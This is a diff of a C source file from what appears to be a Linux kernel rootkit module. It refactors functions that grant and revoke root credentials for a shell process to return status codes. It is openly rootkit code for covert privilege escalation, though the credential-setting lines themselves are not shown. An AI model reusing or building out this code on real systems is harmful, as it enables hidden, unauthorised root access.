@@ -29,11 +29,12 @@
 #include "include.h"
 
 /* Function to issue the root privileges for shell */
-void
+int
 priv_escalation (void)
 {
 	struct task_struct *process;
         struct cred *pcred = prepare_creds();
+	int retv = -EINVAL;
 	process = current;
 	
 	if(!(is_shell_escalated(process->pid)))
@@ -58,23 +59,25 @@ priv_escalation (void)
 		commit_creds(pcred);
 		
 		/* Add to the list of escalted ids */
-		escalate(id_struct);
+		retv = escalate(id_struct);
 		
 		kfree(id_struct);	
         	ROOTKIT_DEBUG("pid of the terminal : %d Escalation done!!!\n", process->pid);
 	}
 	else
-	{	
         	ROOTKIT_DEBUG("pid of the terminal : %d I'm already root!!\n", process->pid);
-	}
 
+	return retv;
 }
 
 /* Function to revoke the root privileges for shell */
-void priv_deescalation(void)
+int
+priv_deescalation
+(void)
 {
 	struct task_struct *process;
         struct cred *pcred = prepare_creds();
+	int retv = -EINVAL;
         
 	process = current;
 
@@ -94,12 +97,11 @@ void priv_deescalation(void)
 		commit_creds(pcred);
 			
 		/* Delete from the list of escalted ids */
-		deescalate(process->pid);
+		retv = deescalate(process->pid);
         	ROOTKIT_DEBUG("pid of the terminal : %d Deescalation done!!!\n", process->pid);
 	}
 	else
-	{	
         	ROOTKIT_DEBUG("pid of the terminal : %d I was never root!!\n", process->pid);
-	}
 	
+	return retv;
 }
